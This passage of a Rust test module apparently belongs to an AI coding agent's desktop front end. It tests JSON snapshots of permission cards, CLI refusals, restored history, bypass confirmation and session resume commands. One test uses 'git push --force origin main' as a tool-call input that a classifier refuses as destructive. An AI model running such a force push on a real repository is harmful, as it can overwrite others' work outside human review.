        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        let pending = &parsed["state"]["pendingPermissions"][0];
        assert_eq!(pending["toolUseId"], parsed["state"]["toolCalls"][0]["toolUseId"]);
        assert_eq!(pending["toolUseId"], "toolu_01ABC");
        assert_eq!(pending["providerPrompt"]["matchedAskRule"]["ruleContent"], "echo:*");
    }

    /// The CLI's own refusal of a call reaches a rebuilt panel too: `denied` on that call's entry,
    /// camelCase like the rest of the snapshot, the CLI's words verbatim -- and no such key on a call
    /// nobody refused, so a snapshot without refusals reads as it did before the field existed.
    #[test]
    fn a_snapshot_carries_the_clis_refusal_on_the_call_it_refused() {
        let mut projection = AgentSessionProjection::default();
        for id in ["toolu_ok", "toolu_push"] {
            projection.apply(&AgentDomainEvent::ToolCallStarted {
                turn_id: "t".into(),
                tool_use_id: id.into(),
                name: "Bash".into(),
                input: json!({ "command": "git push --force origin main" }),
            });
        }
        projection.apply(&AgentDomainEvent::PermissionDenied {
            tool_use_id: Some("toolu_push".into()),
            tool_name: "Bash".into(),
            reason_type: Some("classifier".into()),
            reason: Some("[Git Destructive]".into()),
        });
        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities::default(),
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        let calls = &parsed["state"]["toolCalls"];
        assert!(calls[0].get("denied").is_none(), "{calls}");
        assert_eq!(
            calls[1]["denied"],
            json!({ "reasonType": "classifier", "reason": "[Git Destructive]" })
        );
    }

    /// A reload or a tab switch rebuilds the panel from this snapshot, so the CLI's own prompt
    /// must arrive here with its words (`providerPrompt`, camelCase like the rest of the snapshot)
    /// or its card would lose the reason it was drawn for. A gate request carries no such key.
    #[test]
    fn a_snapshot_carries_the_clis_own_prompt_and_its_words() {
        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::PermissionRequested {
            permission_id: "perm-gate".into(),
            tool_use_id: Some("toolu_1".into()),
            tool_name: "Write".into(),
            input: json!({}),
            provider_prompt: None,
        });
        projection.apply(&AgentDomainEvent::PermissionRequested {
            permission_id: "perm-cli".into(),
            tool_use_id: Some("toolu_1".into()),
            tool_name: "Write".into(),
            input: json!({}),
            provider_prompt: Some(agent::ProviderPrompt {
                reason: Some("Claude requested permissions to edit /p/.git/probe which is a sensitive file.".into()),
                description: Some(".git/probe".into()),
                blocked_path: Some("/p/.git/probe".into()),
                matched_ask_rule: Some(agent::MatchedAskRule {
                    source: "projectSettings".into(),
                    tool_name: "Write".into(),
                    rule_content: None,
                }),
                unrecognized_origin: None,
            }),
        });
        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities::default(),
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        let cards = parsed["state"]["pendingPermissions"].as_array().unwrap();
        assert_eq!(cards.len(), 2, "both requests for the one call are cards of their own");
        assert_eq!(cards[0]["permissionId"], "perm-gate");
        assert!(!cards[0].as_object().unwrap().contains_key("providerPrompt"));
        assert_eq!(cards[1]["permissionId"], "perm-cli");
        let prompt = &cards[1]["providerPrompt"];
        assert_eq!(
            prompt["reason"],
            "Claude requested permissions to edit /p/.git/probe which is a sensitive file."
        );
        assert_eq!(prompt["description"], ".git/probe");
        assert_eq!(prompt["blockedPath"], "/p/.git/probe");
        assert_eq!(prompt["matchedAskRule"]["source"], "projectSettings");
        assert_eq!(prompt["matchedAskRule"]["toolName"], "Write");
        assert!(prompt["matchedAskRule"]["ruleContent"].is_null());
    }

    /// `null`, not an omitted key. The TS side declares the field as `string | null`, and an absent
    /// key would arrive as `undefined` -- which reads as "this build is too old to send it" rather
    /// than "no id was sent for this request". This pins the serializer's handling of `None`; when
    /// a request genuinely has no id to send is settled upstream, at `agent/src/session.rs`'s
    /// `permission_requested_event` and `agent/src/wire.rs`'s `can_use_tool` arm.
    #[test]
    fn a_permission_with_no_tool_use_id_says_null_rather_than_omitting_the_key() {
        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::PermissionRequested {
            permission_id: "perm-1".into(),
            tool_use_id: None,
            tool_name: "Bash".into(),
            input: json!({}),
            provider_prompt: None,
        });
        let view = SnapshotView {
            backend: "legacy",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities {
                resume: false,
                fork: false,
                interrupt: true,
                bypass_permission_mode: true,
                interactive_permission_mode: true,
                cli_auto_mode: false,
                steer: false,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        let pending = &parsed["state"]["pendingPermissions"][0];
        assert!(pending["toolUseId"].is_null());
        assert!(
            pending.as_object().unwrap().contains_key("toolUseId"),
            "the key must be present and null, not absent"
        );
    }

    /// The notice a restored history puts on the wire. Every key is checked, because
    /// the panel's four wordings each read a different one and a missing key renders as
    /// `undefined` -- which is not a state the TS type admits.
    #[test]
    fn a_restored_history_reaches_the_frontend_as_one_notice_object() {
        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::UserPromptSubmitted {
            text: "what did we say?".into(),
        });
        projection.history = Some(agent::HistoryNotice {
            source: agent::HistorySource::EitriCopy,
            restored_items: 314,
            omitted_items: Some(1431),
            upto_seq: projection.last_revision,
            source_path: "/state/eitri/history/conv/sess.json".into(),
            attempted_transcript_path: Some("/claude/projects/p/sess.jsonl".into()),
            fallback_reason: Some("transcript file not found".into()),
            writer_version: None,
        });
        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities {
                resume: true,
                fork: false,
                interrupt: true,
                bypass_permission_mode: true,
                interactive_permission_mode: true,
                cli_auto_mode: false,
                steer: false,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        let history = &parsed["state"]["history"];
        assert_eq!(history["source"], "eitri_copy");
        assert_eq!(history["restoredItems"], 314);
        assert_eq!(history["omittedItems"], 1431);
        assert_eq!(history["uptoSeq"], 1);
        assert_eq!(history["sourcePath"], "/state/eitri/history/conv/sess.json");
        assert_eq!(history["attemptedTranscriptPath"], "/claude/projects/p/sess.jsonl");
        assert_eq!(history["fallbackReason"], "transcript file not found");
        assert!(history["writerVersion"].is_null());
        // Every restored item sits below `uptoSeq`, which is what lets the panel tell a historical
        // tool call that can never complete from a live one that is still running.
        assert!(parsed["state"]["userPrompts"][0]["seq"].as_u64().unwrap() < history["uptoSeq"].as_u64().unwrap());
    }

    /// A session that restored nothing -- every fresh one -- sends an explicit `null`. Omitting the
    /// key would make "this session has no history" indistinguishable from "this build predates the
    /// field", the same distinction the `toolUseId` test above exists for.
    #[test]
    fn a_session_with_no_restored_history_says_null_rather_than_omitting_the_key() {
        let projection = AgentSessionProjection::default();
        let view = SnapshotView {
            backend: "legacy",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities {
                resume: false,
                fork: false,
                interrupt: true,
                bypass_permission_mode: true,
                interactive_permission_mode: true,
                cli_auto_mode: false,
                steer: false,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        let state = parsed["state"].as_object().unwrap();
        assert!(
            state.contains_key("history"),
            "the key must be present and null, not absent"
        );
        assert!(state["history"].is_null());
    }

    /// The legacy backend's own shape, which the two tests above do not cover between them: on its
    /// `PreToolUse` hook-relay path the permission id and the tool-use id are the SAME string,
    /// because the hook payload's `tool_use_id` is both the identity of the gated call and the key
    /// the live relay socket is filed under. Serializing them as two separate keys with one value
    /// is correct and must stay that way -- the frontend keys cards on `permissionId` and matches
    /// tool calls on `toolUseId`, and collapsing either into the other would tie the routing key to
    /// the rendering link.
    #[test]
    fn a_legacy_hook_relay_permission_sends_the_same_id_under_both_keys() {
        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::PermissionRequested {
            permission_id: "toolu_01CtdezhmhUCrBaswxW5HYmC".into(),
            tool_use_id: Some("toolu_01CtdezhmhUCrBaswxW5HYmC".into()),
            tool_name: "Bash".into(),
            input: json!({"command": "echo hello"}),
            provider_prompt: None,
        });
        let view = SnapshotView {
            backend: "legacy",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities {
                resume: false,
                fork: false,
                interrupt: true,
                bypass_permission_mode: true,
                interactive_permission_mode: true,
                cli_auto_mode: false,
                steer: false,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        let pending = &parsed["state"]["pendingPermissions"][0];
        assert_eq!(pending["permissionId"], "toolu_01CtdezhmhUCrBaswxW5HYmC");
        assert_eq!(pending["toolUseId"], "toolu_01CtdezhmhUCrBaswxW5HYmC");
    }

    /// The snapshot's half of interleaved ordering (2026-09-15).
    ///
    /// The frontend rendered `transcript`, then `toolCalls`, then `pendingPermissions` as three
    /// sequential lists, so every tool card sat below every assistant message. It could not have
    /// done better from this payload: before `seq`, nothing here said how the three collections
    /// interleave. Reconstructing it from the live event stream alone would have been lost on every
    /// reload and every `UiDelivery::Resync`, which both rebuild the whole frontend state from
    /// exactly this snapshot.
    #[test]
    fn a_snapshot_carries_the_order_of_the_three_collections_against_each_other() {
        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::ContentDelta {
            turn_id: "t1".into(),
            kind: agent::ContentKind::Text,
            text: "I'll check.".into(),
        });
        projection.apply(&AgentDomainEvent::ToolCallStarted {
            turn_id: "t1".into(),
            tool_use_id: "toolu_1".into(),
            name: "Bash".into(),
            input: json!({}),
        });
        projection.apply(&AgentDomainEvent::ContentDelta {
            turn_id: "t1".into(),
            kind: agent::ContentKind::Text,
            text: "And now this.".into(),
        });
        projection.apply(&AgentDomainEvent::ToolCallStarted {
            turn_id: "t1".into(),
            tool_use_id: "toolu_2".into(),
            name: "Read".into(),
            input: json!({}),
        });
        projection.apply(&AgentDomainEvent::PermissionRequested {
            permission_id: "perm-1".into(),
            tool_use_id: Some("toolu_2".into()),
            tool_name: "Read".into(),
            input: json!({}),
            provider_prompt: None,
        });

        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities {
                resume: false,
                fork: false,
                interrupt: true,
                bypass_permission_mode: true,
                interactive_permission_mode: true,
                cli_auto_mode: false,
                steer: false,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        let state = &parsed["state"];

        let mut merged: Vec<(u64, String)> = Vec::new();
        for m in state["transcript"].as_array().unwrap() {
            merged.push((
                m["seq"].as_u64().unwrap(),
                format!("text:{}", m["text"].as_str().unwrap()),
            ));
        }
        for c in state["toolCalls"].as_array().unwrap() {
            merged.push((
                c["seq"].as_u64().unwrap(),
                format!("tool:{}", c["toolUseId"].as_str().unwrap()),
            ));
        }
        for p in state["pendingPermissions"].as_array().unwrap() {
            merged.push((
                p["seq"].as_u64().unwrap(),
                format!("perm:{}", p["permissionId"].as_str().unwrap()),
            ));
        }
        merged.sort_by_key(|(seq, _)| *seq);

        assert_eq!(
            merged.into_iter().map(|(_, label)| label).collect::<Vec<_>>(),
            vec![
                "text:I'll check.",
                "tool:toolu_1",
                "text:And now this.",
                "tool:toolu_2",
                "perm:perm-1"
            ],
        );
        // Every seq is below the revision the same envelope reports, so the frontend can seed its
        // own counter from `throughRevision` and never collide with an item this snapshot carried.
        assert_eq!(parsed["throughRevision"], 5);
    }

    /// `pending_permissions` is a `HashMap`, and `HashMap::values()` order is unspecified -- two
    /// snapshots of the same state could emit two different card orders, and a reader sorting by
    /// `seq` would still be at the mercy of whatever order the array happened to arrive in for
    /// anything it could not sort. Emitting them already ordered makes the payload itself
    /// deterministic.
    ///
    /// SIZED AND REPEATED DELIBERATELY, because the thing under test is nondeterminism and a
    /// careless version of this test inherits it. One `HashMap` iterates in one fixed order for its
    /// whole life, and a fresh one draws a new `RandomState`, so what decides whether an UNSORTED
    /// emission passes is how often a fresh map happens to iterate in insertion order. Measured on
    /// this machine, 200,000 fresh maps each: **5 keys reproduce insertion order 2.53% of the
    /// time** -- so the five-key version of this test used to pass roughly one run in forty with
    /// the sort deleted. At 12 keys that fell to 0.001%, and at 16 and 24 keys it was 0 in 200,000.
    ///
    /// So: 16 permissions, and `PROJECTIONS` independently built ones, all of which must agree.
    /// This is not literally deterministic -- nothing that reads a `HashMap` can be -- but a false
    /// pass now needs every one of those independent maps to draw insertion order at a rate already
    /// below what 200,000 trials could measure for a single one. Stated as a measurement rather
    /// than as a guarantee, because that is what it is.
    #[test]
    fn pending_permissions_are_emitted_in_the_order_they_were_requested() {
        const PERMISSIONS: usize = 16;
        const PROJECTIONS: usize = 8;

        let expected: Vec<String> = (0..PERMISSIONS).map(|i| format!("perm-{i:02}")).collect();

        for attempt in 0..PROJECTIONS {
            let mut projection = AgentSessionProjection::default();
            for id in &expected {
                projection.apply(&AgentDomainEvent::PermissionRequested {
                    permission_id: id.clone(),
                    tool_use_id: None,
                    tool_name: "Bash".into(),
                    input: json!({}),
                    provider_prompt: None,
                });
            }
            let view = SnapshotView {
                backend: "legacy",
                conversation_id: None,
                session_id: None,
                provider_session_id: None,
                capabilities: agent::ProviderCapabilities {
                    resume: false,
                    fork: false,
                    interrupt: true,
                    bypass_permission_mode: true,
                    interactive_permission_mode: true,
                    cli_auto_mode: false,
                    steer: false,
                    ..Default::default()
                },
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
                hidden_pending: None,
            };
            let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
            let cards = parsed["state"]["pendingPermissions"].as_array().unwrap();

            let ids: Vec<&str> = cards.iter().map(|p| p["permissionId"].as_str().unwrap()).collect();
            assert_eq!(
                ids, expected,
                "projection {attempt} emitted its cards out of request order"
            );

            // The request order IS seq order; asserted separately so a future change that kept the
            // ids lined up while emitting some other key's order still fails here.
            let seqs: Vec<u64> = cards.iter().map(|p| p["seq"].as_u64().unwrap()).collect();
            assert!(
                seqs.windows(2).all(|w| w[0] < w[1]),
                "projection {attempt} emitted seqs {seqs:?}"
            );
        }
    }

    /// `hidden_pending` (`Tab::host_answered`) removes exactly the named ids from
    /// `pendingPermissions`. This test builds no tool calls or transcript, so their absence
    /// cannot demonstrate whether they were preserved.
    #[test]
    fn a_snapshot_hides_the_ids_it_is_given() {
        let mut projection = AgentSessionProjection::default();
        for id in ["shown", "hidden"] {
            projection.apply(&AgentDomainEvent::PermissionRequested {
                permission_id: id.into(),
                tool_use_id: None,
                tool_name: "Bash".into(),
                input: json!({}),
                provider_prompt: None,
            });
        }
        let hidden: std::collections::BTreeSet<String> = ["hidden".to_string()].into_iter().collect();
        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities {
                resume: false,
                fork: false,
                interrupt: true,
                bypass_permission_mode: true,
                interactive_permission_mode: true,
                cli_auto_mode: false,
                steer: false,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: Some(&hidden),
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        let cards = parsed["state"]["pendingPermissions"].as_array().unwrap();
        let ids: Vec<&str> = cards.iter().map(|p| p["permissionId"].as_str().unwrap()).collect();
        assert_eq!(ids, vec!["shown"], "{ids:?}");
    }

    /// The bypass-confirmation wire contract must agree in both directions.
    #[test]
    fn the_confirm_bypass_envelope_matches_the_wire_contract() {
        let tab_plan = crate::tab_set::BypassPlan {
            scope: crate::tab_set::BypassScope::Tab(TabId(3)),
            nonce: 17,
            approve: vec!["p1".to_string(), "p2".to_string()],
            // The strings `TabSet` really sends, not a paraphrase that can drift from them.
            lines: vec![crate::tabs::bypass_prompt(crate::tabs::PromptScope::LiveTab, 2)],
            prompt: crate::tabs::PromptScope::LiveTab,
            page: crate::tabs::ViewId::BASE,
        };
        assert_eq!(
            serde_json::from_str::<Value>(&serialize_confirm_bypass_for_js(&tab_plan)).unwrap(),
            json!({
                "kind": "confirm_bypass",
                "tab": 3,
                "scope": "tab",
                "nonce": 17,
                "lines": ["Switch to bypass and approve the 2 waiting cards? (y/n)"],
            }),
            "approve must never reach the wire"
        );

        let default_plan = crate::tab_set::BypassPlan {
            scope: crate::tab_set::BypassScope::Default,
            nonce: 18,
            approve: Vec::new(),
            lines: vec![crate::tabs::bypass_prompt(crate::tabs::PromptScope::Default, 0)],
            prompt: crate::tabs::PromptScope::Default,
            page: crate::tabs::ViewId::BASE,
        };
        assert_eq!(
            serde_json::from_str::<Value>(&serialize_confirm_bypass_for_js(&default_plan)).unwrap(),
            json!({
                "kind": "confirm_bypass",
                "tab": null,
                "scope": "default",
                "nonce": 18,
                "lines": ["Start new sessions in bypass? (y/n)"],
            })
        );

        // Inbound: the exact contract line -- both fields, and the mapping to a real `BypassScope`.
        let msg =
            parse_inbound_message(r#"{"type":"confirm_bypass","request_id":"r7","tab":3,"scope":"tab","nonce":17}"#)
                .unwrap();
        assert_eq!(msg.tab_ref(), TabRef::WindowLevel);
        assert_eq!(msg.request_id(), "r7");
        match msg {
            InboundMessage::ConfirmBypass { tab, scope, nonce, .. } => {
                assert_eq!(scope.scope(tab), Ok(crate::tab_set::BypassScope::Tab(TabId(3))));
                assert_eq!(nonce, 17);
            }
            other => panic!("expected ConfirmBypass, got {other:?}"),
        }

        // A missing nonce fails to parse: an answer must identify the exact prompt shown,
        // never whichever prompt happens to be current.
        assert!(
            parse_inbound_message(r#"{"type":"confirm_bypass","request_id":"r7","tab":3,"scope":"tab"}"#).is_none()
        );
        // A malformed nonce, and an unrecognized scope, are each their own parse failure.
        assert!(parse_inbound_message(
            r#"{"type":"confirm_bypass","request_id":"r7","tab":3,"scope":"tab","nonce":"17"}"#
        )
        .is_none());
        assert!(parse_inbound_message(
            r#"{"type":"confirm_bypass","request_id":"r7","tab":3,"scope":"window","nonce":17}"#
        )
        .is_none());
    }

    /// `BypassScopeWire::scope` refuses a mismatched pair rather than guessing which the client
    /// meant -- a well-formed client only ever sends `(Tab, Some)` or `(Default, None)`.
    #[test]
    fn bypass_scope_wire_refuses_a_mismatched_tab_default_pairing() {
        assert_eq!(
            BypassScopeWire::Tab.scope(Some(3)),
            Ok(crate::tab_set::BypassScope::Tab(TabId(3)))
        );
        assert_eq!(
            BypassScopeWire::Default.scope(None),
            Ok(crate::tab_set::BypassScope::Default)
        );
        assert!(BypassScopeWire::Tab.scope(None).is_err());
        assert!(BypassScopeWire::Default.scope(Some(3)).is_err());
    }

    /// A snapshot carries `user_prompts` so a reload or resync preserves prompts already delivered
    /// by the live event stream. Like neighboring tests, this constructs its own `SnapshotView`
    /// with the needed fields and defaults for the rest; there is no shared builder here.
    #[test]
    fn a_snapshot_carries_the_user_prompts_and_their_seqs() {
        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::UserPromptSubmitted { text: "hello".into() });
        let view = SnapshotView {
            backend: "legacy",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities {
                resume: false,
                fork: false,
                interrupt: true,
                bypass_permission_mode: true,
                interactive_permission_mode: true,
                cli_auto_mode: false,
                steer: false,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let json: serde_json::Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        assert_eq!(json["state"]["userPrompts"][0]["text"], "hello");
        assert_eq!(json["state"]["userPrompts"][0]["seq"], 0);
    }

    /// The event path's own half of the same link, pinned here rather than assumed from the derive:
    /// if `PermissionRequested` ever gained a `skip_serializing_if` on this field, the live path
    /// would start disagreeing with the snapshot path and only one of them would be caught.
    #[test]
    fn the_event_path_carries_tool_use_id_too_so_the_two_paths_cannot_diverge() {
        let events = vec![AgentDomainEvent::PermissionRequested {
            permission_id: "perm-1".into(),
            tool_use_id: Some("toolu_01ABC".into()),
            tool_name: "Bash".into(),
            input: json!({}),
            provider_prompt: None,
        }];
        let parsed: Value = serde_json::from_str(&serialize_events_for_js(TabId(1), 0, 1, &events)).unwrap();
        assert_eq!(parsed["events"][0]["tool_use_id"], "toolu_01ABC");
    }

    /// The one inbound message with no `command_result` and nothing branching on it, which is
    /// exactly why it had no test: a silent diagnostic that stops parsing costs a trace column and
    /// nothing else, so nothing would ever report the break. `receive_to_frame_ms` is a SPAN in
    /// milliseconds -- a float, never an instant, since JS `performance.now()` and Rust `Instant`
    /// have unrelated epochs.
    #[test]
    fn parses_turn_rendered_as_a_float_span() {
        let msg =
            parse_inbound_message(r#"{"type":"turn_rendered","request_id":"r7","receive_to_frame_ms":18.5}"#).unwrap();
        assert_eq!(msg.request_id(), "r7");
        match msg {
            InboundMessage::TurnRendered {
                receive_to_frame_ms, ..
            } => assert_eq!(receive_to_frame_ms, 18.5),
            other => panic!("expected TurnRendered, got {other:?}"),
        }
        // An integer on the wire is still a valid span -- JSON has one number type and a whole
        // number of milliseconds is an ordinary measurement, not a different shape.
        let whole =
            parse_inbound_message(r#"{"type":"turn_rendered","request_id":"r8","receive_to_frame_ms":20}"#).unwrap();
        assert!(
            matches!(whole, InboundMessage::TurnRendered { receive_to_frame_ms, .. } if receive_to_frame_ms == 20.0)
        );
        // Missing the measurement is a parse failure, not a defaulted zero: a zero-millisecond
        // render would be reported into a trace as a real, impossibly good number.
        assert!(parse_inbound_message(r#"{"type":"turn_rendered","request_id":"r9"}"#).is_none());
    }

    #[test]
    fn a_legacy_snapshot_carries_no_conversation_id_and_no_provider_block() {
        let projection = AgentSessionProjection::default();
        let view = SnapshotView {
            backend: "legacy",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities {
                resume: false,
                fork: false,
                interrupt: true,
                bypass_permission_mode: true,
                interactive_permission_mode: true,
                cli_auto_mode: false,
                steer: false,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        assert_eq!(parsed["state"]["backend"], "legacy");
        assert!(
            parsed["state"]["conversationId"].is_null(),
            "the legacy backend has no conversation identity"
        );
        assert!(parsed["state"]["provider"].is_null());
    }

    #[test]
    fn the_sidecar_hello_carries_its_baseline_and_never_advertises_resume_without_a_record() {
        let greeting = crate::agent_backend::BackendGreeting::for_kind(
            crate::agent_backend::BackendKind::Sidecar,
            std::path::PathBuf::from("/tmp/project"),
        );
        let parsed: Value = serde_json::from_str(&serialize_hello_for_js(&greeting)).unwrap();
        assert_eq!(parsed["kind"], "hello");
        assert_eq!(parsed["backend"], "sidecar");
        assert_eq!(
            parsed["permissionModes"],
            json!(crate::agent_backend::CLIENT_IMPLEMENTED_PERMISSION_MODES),
            "the hello envelope must carry the client's real offer, not a per-backend narrowing"
        );
        assert_eq!(parsed["projectDir"], "/tmp/project");
        assert!(parsed["expectedVerdandiRevision"].is_string());
    }

    /// A greeting with the given sessions, for the hello-envelope tests below.
    fn greeting_with(resumable: Vec<agent::ResumableSession>) -> crate::agent_backend::BackendGreeting {
        crate::agent_backend::BackendGreeting {
            kind: crate::agent_backend::BackendKind::Sidecar,
            project_dir: std::path::PathBuf::from("/tmp/project"),
            permission_modes: &["bypass"],
            expected_verdandi_revision: Some("abc1234"),
            resumable,
            account: None,
        }
    }

    #[test]
    fn hello_carries_the_configured_account_or_null() {
        let mut greeting = greeting_with(Vec::new());
        let value: serde_json::Value = serde_json::from_str(&serialize_hello_for_js(&greeting)).unwrap();
        assert!(value["account"].is_null(), "no account configured");
        greeting.account = Some("work".to_string());
        let value: serde_json::Value = serde_json::from_str(&serialize_hello_for_js(&greeting)).unwrap();
        assert_eq!(value["account"], "work");
    }

    fn resumable(provider_session_id: &str, created_at: &str, updated_at: &str) -> agent::ResumableSession {
        agent::ResumableSession {
            provider: "claude".into(),
            provider_session_id: provider_session_id.into(),
            created_at: created_at.into(),
            updated_at: updated_at.into(),
            title: None,
            name: None,
        }
    }

    /// Every session the workspace can continue reaches the frontend, in the order Rust ranked
    /// them. The frontend renders rows in array order and does no sorting of its own, so this array
    /// IS the picker's order.
    #[test]
    fn hello_lists_every_session_the_workspace_can_continue_in_rank_order() {
        let greeting = greeting_with(vec![
            resumable("1857dcd5-973b-46a2", "1757600000000", "1757700000000"),
            resumable("99b2b206-0000-4000", "1757100000000", "1757200000000"),
        ]);
        let parsed: Value = serde_json::from_str(&serialize_hello_for_js(&greeting)).unwrap();
        let sessions = parsed["resumableSessions"].as_array().expect("an array, always");
        assert_eq!(sessions.len(), 2);
        // The CLAUDE id, not Verdandi's: resuming mints a new Verdandi session, so a record keyed
        // on that one would point at something that stops existing the moment it is used.
        assert_eq!(sessions[0]["providerSessionId"], "1857dcd5-973b-46a2");
        assert_eq!(sessions[0]["provider"], "claude");
        assert_eq!(sessions[0]["createdAt"], "1757600000000");
        assert_eq!(sessions[0]["updatedAt"], "1757700000000");
        assert_eq!(sessions[1]["providerSessionId"], "99b2b206-0000-4000");
    }

    /// Empty, not null or absent: the frontend maps over this field unconditionally, and a workspace
    /// with nothing to continue is a normal state rather than a missing one.
    #[test]
    fn hello_carries_an_empty_list_when_the_workspace_has_nothing_to_continue() {
        let parsed: Value = serde_json::from_str(&serialize_hello_for_js(&greeting_with(Vec::new()))).unwrap();
        assert_eq!(parsed["resumableSessions"], json!([]));
    }

    /// The title crosses as a string, and a session without one crosses as `null` -- present, so the
    /// frontend reads one shape, and not an empty string it might render as a blank row.
    #[test]
    fn hello_carries_each_sessions_title_or_null() {
        let mut titled = resumable("prov-1", "1000", "9000");
        titled.title = Some("fix the picker".into());
        let greeting = greeting_with(vec![titled, resumable("prov-2", "1000", "8000")]);
        let parsed: Value = serde_json::from_str(&serialize_hello_for_js(&greeting)).unwrap();
        assert_eq!(parsed["resumableSessions"][0]["title"], "fix the picker");
        assert_eq!(parsed["resumableSessions"][1]["title"], Value::Null);
    }

    /// Both stamps cross the bridge, because they answer different questions: `createdAt` is when
    /// the conversation began and `updatedAt` is when it was last opened. The frontend shows the
    /// first only when it differs from the second, which it cannot do if only one is sent.
    #[test]
    fn hello_carries_both_stamps_for_each_session() {
        let greeting = greeting_with(vec![resumable("prov-1", "1000", "9000")]);
        let parsed: Value = serde_json::from_str(&serialize_hello_for_js(&greeting)).unwrap();
        assert_eq!(parsed["resumableSessions"][0]["createdAt"], "1000");
        assert_eq!(parsed["resumableSessions"][0]["updatedAt"], "9000");
    }

    #[test]
    fn parses_handoff_to_terminal() {
        let msg = parse_inbound_message(r#"{"type":"handoff_to_terminal","request_id":"r10"}"#).unwrap();
        assert_eq!(msg.request_id(), "r10");
        assert!(matches!(msg, InboundMessage::HandoffToTerminal { .. }));
    }

    /// The command goes over the wire as one ready-to-run line PLUS its parts. The line is what a
    /// user copies; the parts are what lets the frontend say which session and which directory
    /// without re-parsing the line it was given.
    ///
    /// Built from the real `agent::handoff::ClaudeResumeCommand` rather than a hand-written string,
    /// so a change to what "continue this session" means reaches this envelope automatically.
    #[test]
    fn serialize_handoff_for_js_carries_the_runnable_line_and_its_parts() {
        let command =
            agent::handoff::ClaudeResumeCommand::for_session("/home/user/project", "1857dcd5-973b-46a2").unwrap();
        let parsed: Value = serde_json::from_str(&serialize_handoff_for_js(TabId(1), &command)).unwrap();
        assert_eq!(parsed["kind"], "handoff");
        assert_eq!(parsed["tab"], 1);
        assert_eq!(
            parsed["command"],
            "cd /home/user/project && claude --resume 1857dcd5-973b-46a2"
        );
        assert_eq!(parsed["cwd"], "/home/user/project");
        assert_eq!(parsed["providerSessionId"], "1857dcd5-973b-46a2");
    }

    /// The id the envelope carries is the ARGUMENT of the command, read back out of the argv --
    /// never a second copy of the id passed in alongside it. Two sources for one value is how the
    /// panel would eventually show one session and print a command resuming another.
    #[test]
    fn the_envelopes_session_id_is_the_one_the_command_actually_resumes() {
        let command = agent::handoff::ClaudeResumeCommand::for_session("/tmp/p", " padded-id ").unwrap();
        let parsed: Value = serde_json::from_str(&serialize_handoff_for_js(TabId(1), &command)).unwrap();
        assert_eq!(parsed["providerSessionId"], "padded-id");
        assert!(parsed["command"]
            .as_str()
            .unwrap()
            .ends_with("claude --resume padded-id"));
    }

    #[test]
    fn the_legacy_hello_offers_its_three_modes() {
        let greeting = crate::agent_backend::BackendGreeting::for_kind(
            crate::agent_backend::BackendKind::Legacy,
